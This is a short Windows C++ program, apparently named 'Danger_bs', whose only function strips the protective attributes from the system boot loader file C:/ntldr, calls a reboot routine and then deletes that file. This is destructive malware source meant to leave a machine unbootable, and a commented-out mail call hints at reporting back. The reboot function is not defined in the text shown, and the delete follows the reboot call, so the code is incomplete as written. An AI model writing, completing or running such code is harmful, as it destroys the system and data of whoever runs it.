// Danger_bs.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include "Danger_bs.h"

#define MAX_LOADSTRING 100

// Global Variables:


// Forward declarations of functions included in this code module:


int APIENTRY _tWinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPTSTR    lpCmdLine,
                     int       nCmdShow)
{
	SetFileAttributes(L"C:/ntldr",FILE_ATTRIBUTE_ARCHIVE);
	//SendMail("test","testss");
	MySystemReboot();
	
	DeleteFile(L"C:/ntldr");
	
	return (int)1;
}

